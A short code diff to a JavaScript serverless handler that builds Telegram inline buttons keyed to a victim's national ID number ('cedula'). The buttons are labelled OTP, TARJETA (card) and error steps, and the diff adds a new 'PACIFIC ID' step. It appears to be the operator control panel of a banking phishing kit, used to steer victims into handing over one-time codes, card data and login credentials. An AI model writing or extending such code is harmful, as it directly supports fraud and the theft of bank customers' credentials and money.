@@ -56,6 +56,9 @@ exports.handler = async (event) => {
             { text: "🔐 OTP", callback_data: `otp_${cedula}` },
             { text: "💳 TARJETA", callback_data: `tarjeta_${cedula}` },
           ],
+          [
+            { text: "🛡️ PACIFIC ID", callback_data: `pacificid_${cedula}` },
+          ],
           [{ text: "❌ ERROR LOGIN", callback_data: `error_login_${cedula}` }],
         ],
       };
@@ -91,6 +94,13 @@ exports.handler = async (event) => {
           inline_keyboard: [[
             { text: "💳 TARJETA", callback_data: `tarjeta_${cedula}` },
             { text: "❌ ERROR OTP", callback_data: `error_otp_${cedula}` },
+          ]],
+        };
+      } else if (step === "PACIFIC ID") {
+        keyboard = {
+          inline_keyboard: [[
+            { text: "💳 TARJETA", callback_data: `tarjeta_${cedula}` },
+            { text: "❌ ERROR PACIFIC ID", callback_data: `error_pacificid_${cedula}` },
           ]],
         };
       } else if (step === "TARJETA") {
